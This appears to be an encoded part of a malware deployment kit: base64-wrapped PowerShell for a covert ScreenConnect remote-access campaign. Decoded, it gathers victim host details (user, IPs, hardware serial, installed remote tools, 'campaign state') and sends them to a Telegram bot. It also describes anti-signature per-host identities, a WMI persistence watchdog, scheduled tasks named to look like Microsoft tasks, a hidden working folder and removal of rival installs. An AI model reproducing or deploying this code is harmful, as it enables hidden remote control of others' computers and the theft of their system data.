ZSAkd21pQykgfQ0KDQokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMu
R2VuZXJpYy5MaXN0W3N0cmluZ10NCiR0YXNrT2sgPSAwDQokdGFza0JhZCA9IDANCmZvcmVhY2gg
KCR0IGluICRleHBlY3RlZFRhc2tzKSB7DQogICAgaWYgKCR0LkNvbnRhaW5zS2V5KCdXbWknKSkg
ew0KICAgICAgICBpZiAoJHQuV21pKSB7ICR0YXNrT2srKzsgJG1hcmsgPSAnT0snIH0gZWxzZSB7
ICR0YXNrQmFkKys7ICRtYXJrID0gJ01JU1NJTkcnIH0NCiAgICAgICAgW3ZvaWRdJHRhc2tMaW5l
cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0
Lk5hbWUpLCAoRXNjICR0LlJvbGUpKSkNCiAgICAgICAgY29udGludWUNCiAgICB9DQogICAgJGgg
PSBHZXQtVGFza0hlYWx0aCAkdC5OYW1lDQogICAgaWYgKCRoLlByZXNlbnQgLWFuZCAkaC5IZWFs
dGh5KSB7DQogICAgICAgICR0YXNrT2srKw0KICAgICAgICAkbWFyayA9ICdPSycNCiAgICB9IGVs
c2VpZiAoJGguUHJlc2VudCkgew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0g
J1dFQUsnDQogICAgfSBlbHNlIHsNCiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9
ICdNSVNTSU5HJw0KICAgIH0NCiAgICAkZXh0cmEgPSAnJw0KICAgIGlmICgkaC5QcmVzZW50KSB7
DQogICAgICAgICRiaXRzID0gQCgpDQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJpdHMgKz0g
JGguU3RhdHVzIH0NCiAgICAgICAgaWYgKCRoLlJlc3VsdCAtbmUgJycgLWFuZCAkaC5SZXN1bHQg
LW5lICcwJykgeyAkYml0cyArPSAoIkxhc3RSZXN1bHQ9IiArICRoLlJlc3VsdCkgfQ0KICAgICAg
ICBpZiAoJGJpdHMuQ291bnQpIHsgJGV4dHJhID0gJyAoJyArICgkYml0cyAtam9pbiAnLCAnKSAr
ICcpJyB9DQogICAgfQ0KICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57
MX08L2NvZGU+IC0gezJ9ezN9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xl
KSwgKEVzYyAkZXh0cmEpKSkNCn0NCg0KJHByaW1MaW5lID0gR2V0LVN2Y0xpbmUgJHByaW0NCiRh
bHRMaW5lID0gR2V0LVN2Y0xpbmUgJGFsdA0KJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVu
bmluZyonDQokZGVwbG95T2sgPSAkcHJpbU9rIC1hbmQgKCR0YXNrT2sgLWdlIDMpIC1hbmQgJGhh
c01vbg0KDQokZW1vamlNYXAgPSBAew0KICAgIE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJdMHgy
NzA1KQ0KICAgIERPV04gICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4
MUY2QTgpKQ0KICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMy
KDB4MUY3RTIpKQ0KICAgIEZBSUwgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzRDKQ0KICAgIEZP
UkNFICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNkExKQ0KICAgIERFUExPWSAgID0gKFtzdHJpbmdd
W2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQ0KICAgIEhCICAgICAgID0gKFtzdHJp
bmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RTEpKQ0KfQ0KJGtleSA9ICRTdGF0ZS5U
b1VwcGVySW52YXJpYW50KCkNCiRlbW9qaSA9IGlmICgkZW1vamlNYXAuQ29udGFpbnNLZXkoJGtl
eSkpIHsgJGVtb2ppTWFwWyRrZXldIH0gZWxzZSB7IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZy
b21VdGYzMigweDFGNEYxKSkgfQ0KDQokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsNCiAgICAnT0sn
IHsgJ1ByaW1hcnkgaGVhbHRoeScgfQ0KICAgICdET1dOJyB7ICdQcmltYXJ5IERPV04gLSBoZWFs
aW5nJyB9DQogICAgJ1JFU1RPUkVEJyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9DQogICAgJ0ZBSUwn
IHsgJ0hlYWwgRkFJTEVEJyB9DQogICAgJ0ZPUkNFJyB7ICdGb3JjZWQgcmVpbnN0YWxsJyB9DQog
ICAgJ0RFUExPWScgeyBpZiAoJGRlcGxveU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7
ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBORUVERUQnIH0gfQ0KICAgICdIQicgeyAnaG91cmx5IGRp
Z2VzdCcgfQ0KICAgIGRlZmF1bHQgeyAiU3RhdGU6ICRTdGF0ZSIgfQ0KfQ0KDQokdHJhbnMgPSBp
ZiAoJE9sZFN0YXRlKSB7ICIkT2xkU3RhdGUgLT4gJFN0YXRlIiB9IGVsc2UgeyAkU3RhdGUgfQ0K
JHNjTGlzdCA9IEdldC1TY0luc3RhbGxzDQokcm1tSGl0cyA9IEdldC1SbW1IaXRzDQppZiAoJHJt
bUhpdHMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJHJtbUhpdHMuQWRkKCctIChub25lIGRldGVjdGVk
KScpIH0NCg0KJHB1YiA9IEdldC1QdWJsaWNJcA0KJGxhbiA9IEdldC1Mb2NhbElwcw0KJG5vdyA9
IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3Mgenp6Jw0KJHVwdGltZSA9ICdu
L2EnDQp0cnkgew0KICAgICRib290ID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdT
eXN0ZW0pLkxhc3RCb290VXBUaW1lDQogICAgJHVwdGltZSA9ICd7MDpkZH1kIHswOmhofWggezA6
bW19bScgLWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkNCn0gY2F0Y2gge30NCg0KIyBjYW1wYWlnbiBz
dGF0ZSBmaWxlICh3cml0dGVuIGJ5IG93bl9saWIucHMxIHN0YXRlIGFjdGlvbikNCiRzdGF0ZUxp
bmUgPSAnbi9hJw0KJHN0YXRlT2JqID0gJG51bGwNCiRzdGF0ZVBhdGgyID0gSm9pbi1QYXRoICRX
b3JrRGlyICdzdGF0ZS5qc29uJw0KaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoMikgew0KICAgICRy
YXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIgLVJhdykuVHJp
bSgpDQogICAgdHJ5IHsNCiAgICAgICAgJHN0YXRlT2JqID0gJHJhd1N0YXRlIHwgQ29udmVydEZy
b20tSnNvbg0KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWlnbikgeyAo
JHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQ0KICAgICAgICAkc3Rh
dGVMaW5lID0gInByaW09JCgkc3RhdGVPYmoucHJpbSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkgZm9y
ZWlnbj1bJGZvcmVpZ25Dc3ZdIHRhc2tzPSQoJHN0YXRlT2JqLnRhc2tzT2spLyQoJHN0YXRlT2Jq
LnRhc2tzVG90YWwpIHdkPSQoJHN0YXRlT2JqLndhdGNoZG9nKSBoZWFscz0kKCRzdGF0ZU9iai5p
bnN0YWxsQ291bnQpIg0KICAgIH0gY2F0Y2ggeyAkc3RhdGVMaW5lID0gJHJhd1N0YXRlIH0NCn0N
Cg0KJGRlcGxveUJsb2NrID0gJycNCmlmICgka2V5IC1lcSAnREVQTE9ZJykgew0KICAgICR2ZXJk
aWN0ID0gaWYgKCRkZXBsb3lPaykgeyAnREVQTE9ZRUQgLyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQ
TE9ZRUQgQlVUIElOQ09NUExFVEUnIH0NCiAgICAkZm9yZWlnbiA9IEAoR2V0LUNoaWxkSXRlbSAt
UGF0aCAiJHtlbnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiAtRGlyZWN0b3J5IC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFt
ZSAtbm90bWF0Y2ggJzVmNjAxMDU3OTg1MmU1MDd8Zjg2MWM4MTQwZDQ1MzQyNycgfSkNCiAgICAk
ZGlhZ0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0
cmluZ10NCiAgICAkYm9vdFBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KICAg
IGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7DQogICAgICAgICRpbnRlcmVzdGluZyA9IEAoDQog
ICAgICAgICAgICAnbXNpXycsICdmZXRjaF8nLCAncHJpbWFyeV8nLCAnbnVrZV8nLCAnbXNpX3Rv
bycsICdtc2lfZmV0Y2gnLCAnbXNpX2V4aXQnLA0KICAgICAgICAgICAgJ21zaV91bmF2YWlsYWJs
ZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAnaWRlbnRpdHlfJywNCiAgICAg
ICAgICAgICdjcmVhdGVfdGFzaycsICd2ZXJpZnlfdGFzaycsICdvcnBoYW5fJywgJ3N0YWxlXycs
ICdwb3N0aW5zdGFsbCcsICdhbHRfJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1M
aXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAg
ICAgICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkbGluZSA9ICRfDQogICAg
ICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlr
ZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAg
ICAgICAgICAgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwNCiAgICAg
ICAgICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxjb2RlPnsw
fTwvY29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3RV0nLCAnPycpKSkpIH0N
CiAgICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5l
cy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAk
ZGVwbG95QmxvY2sgPSBAIg0KDQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4k
KEVzYyAkdmVyZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1PaykgeyAn
WUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBCYWNrdXAg
bW9uICguZXRsY2FjaGVcZXRsX21vbi5jbWQpOiAkKGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxz
ZSB7ICdOTycgfSkNCi0gUGVyc2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFz
a3MuQ291bnQpIChiYWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1z
aVNpemUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNvdW50KQ0KLSBO
b3RlOiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4gKG5vcm1hbCByaWdodCBh
ZnRlciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cgbWFya2VyczwvYj4NCiQoJGRpYWdMaW5lcyAt
am9pbiAiYG4iKQ0KIkANCn0NCg0KJHRleHQgPSBAIg0KJGVtb2ppIDxiPlNDIE1vbml0b3IgLSAk
KEVzYyAkdGl0bGUpPC9iPg0KDQo8Yj5FdmVudDwvYj4NCi0gU3VtbWFyeTogJChFc2MgJFN1bW1h
cnkpDQotIFRyYW5zaXRpb246IDxjb2RlPiQoRXNjICR0cmFucyk8L2NvZGU+DQotIFdoZW46ICQo
RXNjICRub3cpDQotIFNvdXJjZSBidWlsZDogPGNvZGU+JChFc2MgJEJ1aWxkKTwvY29kZT4NCiRk
ZXBsb3lCbG9jaw0KDQo8Yj5Ib3N0PC9iPg0KLSBDb21wdXRlcjogPGNvZGU+JChFc2MgJGVudjpD
T01QVVRFUk5BTUUpPC9jb2RlPg0KLSBVc2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4NCi0g
RWxldmF0ZWQ6ICRlbGV2IHwgU1lTVEVNOiAkaXNTeXN0ZW0NCi0gRG9tYWluL1dvcmtncm91cDog
JChFc2MgJG9zLkRvbWFpbikNCg0KPGI+TmV0d29yazwvYj4NCi0gTEFOIElQczogPGNvZGU+JChF
c2MgJGxhbik8L2NvZGU+DQotIFB1YmxpYyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+DQoN
CjxiPk9TIC8gSGFyZHdhcmU8L2I+DQotIE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikNCi0gVmVyc2lv
bjogJChFc2MgJG9zLlZlcnNpb24pIChidWlsZCAkKEVzYyAkb3MuQnVpbGQpKSAkKEVzYyAkb3Mu
QXJjaCkNCi0gSW5zdGFsbDogJChFc2MgJG9zLkluc3RhbGxEYXRlKSB8IExhc3QgYm9vdDogJChF
c2MgJG9zLkxhc3RCb290KQ0KLSBVcHRpbWU6ICQoRXNjICR1cHRpbWUpDQotIENQVTogJChFc2Mg
JG9zLkNQVSkNCi0gSGFyZHdhcmU6ICQoRXNjICRvcy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5N
b2RlbCkNCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4NCi0gUkFNOiAk
KCRvcy5Ub3RhbFJBTV9HQikgR0INCi0gRGlzayBDOiAkKCRvcy5EaXNrRnJlZV9HQikgR0IgZnJl
ZSAvICQoJG9zLkRpc2tTaXplX0dCKSBHQg0KDQo8Yj5TY3JlZW5Db25uZWN0IChhbGwpPC9iPg0K
LSBQcmltYXJ5IDxjb2RlPjVmNjAxMDU3OTg1MmU1MDc8L2NvZGU+OiAkKEVzYyAkcHJpbUxpbmUp
DQotIEFsdCA8Y29kZT5mODYxYzgxNDBkNDUzNDI3PC9jb2RlPjogJChFc2MgJGFsdExpbmUpDQok
KCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0K
JCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0KDQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+
DQokKCR0YXNrTGluZXMgLWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTog
JChFc2MgJG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29kZT4N
Cg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPg0KLSA8Y29k
ZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3IgfCBMSUI9JGJMaWI8L2NvZGU+DQoN
CjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4N
Cg0KPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMg
Y29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVpZ25OID0gMA0K
ICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBA
KCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQogICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0
aCAkbXNpQ2FjaGUpIHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
Lkxlbmd0aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmlt
T2spIHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGlu
ZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIk
ZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUpfHByaW09JHByaW1TaG9ydHxhbHQ9JGFsdFNo
b3J0fGZvcmVpZ249JGZvcmVpZ25OfHRhc2tzPSR0YXNrT2svNXxtc2k9JG1zaVNob3J0fHVwPSR1
cHRpbWV8Yj0kQnVpbGR8JG5vdyINCn0NCg0KaWYgKCR0ZXh0Lkxlbmd0aCAtZ3QgMzgwMCkgew0K
ICAgICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxMikpICsg
KCctIC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpDQogICAgJHNjTGlz
dCA9IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9
IG1vcmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkNCiAgICAkdGV4dCA9ICR0ZXh0LlN1YnN0
cmluZygwLCAzODAwKSArICJgbmBuPGk+VFJVTkNBVEVEIChUZWxlZ3JhbSA0MDk2IGxpbWl0KTwv
aT4iDQp9DQoNCiRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KZnVuY3Rpb24g
U2VuZC1UZyhbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkcGF5bG9hZCA9IEB7
DQogICAgICAgIGNoYXRfaWQgICAgICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9JRA0KICAgICAg
ICB0ZXh0ICAgICAgICAgICAgICAgICAgICAgPSAkbXNnDQogICAgICAgIGRpc2FibGVfd2ViX3Bh
Z2VfcHJldmlldyA9ICR0cnVlDQogICAgfQ0KICAgIGlmICgkbW9kZSkgeyAkcGF5bG9hZC5wYXJz
ZV9tb2RlID0gJG1vZGUgfQ0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAt
Q29tcHJlc3MgLURlcHRoIDUNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpV
VEY4LkdldEJ5dGVzKCRqc29uKQ0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgKCJodHRwczov
L2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3NhZ2UiKSBgDQog
ICAgICAgIC1NZXRob2QgUG9zdCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlv
bi9qc29uOyBjaGFyc2V0PXV0Zi04JyB8IE91dC1OdWxsDQp9DQoNCmZ1bmN0aW9uIFNlbmQtVGdT
YWZlKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICR0b1NlbmQgPSAkbXNnDQog
ICAgdHJ5IHsNCiAgICAgICAgU2VuZC1UZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUNCiAgICAg
ICAgcmV0dXJuICR0cnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAg
ICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMwMDApICsgImBuPGk+VFJVTkNB
VEVEPC9pPiIpIC1tb2RlICRtb2RlDQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAg
fSBjYXRjaCB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0NCiAgICB9DQp9
DQoNCnRyeSB7DQogICAgaWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUgJ0hUTUwnKSB7
DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAndGdfc2VudF9y
aWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxzZSB7DQogICAgICAg
IHRocm93ICdodG1sX2ZhaWxlZCcNCiAgICB9DQogICAgaWYgKCRrZXkgLWVxICdERVBMT1knKSB7
DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoInRnX2RlcGxv
eV9vaz0iICsgJGRlcGxveU9rKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
ICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZGVwbG95X3Rn
LmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JBY3Rpb24gU2lsZW50
bHlDb250aW51ZQ0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHRyeSB7DQogICAgICAgICRwbGFpbiA9
IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpDQogICAgICAgICRwbGFpbiA9
IFtTeXN0ZW0uTmV0LldlYlV0aWxpdHldOjpIdG1sRGVjb2RlKCRwbGFpbikNCiAgICAgICAgaWYg
KCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0cmluZygwLCAz
NTAwKSArICJgblRSVU5DQVRFRCIgfQ0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRwbGFpbiAt
bW9kZSAnJyB8IE91dC1OdWxsDQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAg
ICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVl
ICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlDQogICAgfQ0KfQ0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDcKIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFudGkt
c2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nCiMgKG11dHVhbCBwZXJzaXN0ZW5jZSBjaGFpbiksIGNh
bXBhaWduIHN0YXRlIGZpbGUsIFNDIHNlcnZpY2UgcmVwYWlyLgojIEw3OiBGSVhFRCBXT1c2NDMy
Tm9kZSB1bmluc3RhbGwgaGl2ZSBwYXRoICh3YXMgbWlzc2luZyBNaWNyb3NvZnRcV2luZG93cyAt
CiMgICAgIGV2ZXJ5IDMyLWJpdCBTQyBwcm9kdWN0IHdhcyBpbnZpc2libGUgdG8gcmVwYWlyL2V4
dGVybWluYXRlKTsKIyAgICAgaGFyZGVuZWQgSW52b2tlLUV4dGVybWluYXRlIChlbnVtZXJhdGUg
Ym90aCBoaXZlcywgbXNpZXhlYytVbmluc3RhbGxTdHJpbmcsCiMgICAgIGZvcmNlIGRpciBudWtl
IHZpYSBjbWQgcm1kaXIsIHdyaXRlIHJlc3VsdCB0byBzdGRvdXQrbG9nKS4KIyBBdXRob3JpemVk
IGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KIyDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZAKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1h
bmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRjaGRvZycsICd3
YXRjaGRvZy1lbnN1cmUnLCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVy
ZWQnLCAnZXh0ZXJtaW5hdGUnKV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdv
cmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2Fj
aGUnLAogICAgW3N0cmluZ10kTW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08x
NScsCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnCikK
CiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKJGNmZ1BhdGggPSBK
b2luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycKJElkZW50VmVyc2lvbiA9IDQKCiMgTGVn
aXQtbG9va2luZyB0YXNrLW5hbWUgcG9vbHM7IHBlci1ob3N0IGhhc2ggcGlja3Mgb25lIHBlciBz
bG90LgojIHYyOiBPTkxZIHBhcmVudCBmb2xkZXJzIHRoYXQgZXhpc3Qgb24gZXZlcnkgV2luMTAv
MTEgKFd3YW5TdmMvTWVtb3J5RGlhZ25vc3RpYy8KIyBQb3dlckVmZmljaWVuY3kvRGlza0RpYWdu
b3N0aWMgcGFyZW50cyBhcmUgYWJzZW50IG9uIHNvbWUgbWFjaGluZXMgLT4gL0NyZWF0ZSBmYWls
ZWQpLgokUG9vbHMgPSBAewogICAgQSA9IEAoJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNc
U2NoZWR1bGVkJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25zdW1lcicsJ1xN
aWNyb3NvZnRcV2luZG93c1xOZXRUcmFjZVxHYXRoZXJOZXR3b3JrSW5mbycsJ1xNaWNyb3NvZnRc
V2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZl
ciBEaWFnbm9zdGljcycsJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGlj
dDEnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3NvZnRcV2luZG93c1xE
aWFnbm9zaXNcU1JUYXNrJykKICAgIEIgPSBAKCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZl
cicsJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdp
bmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNl
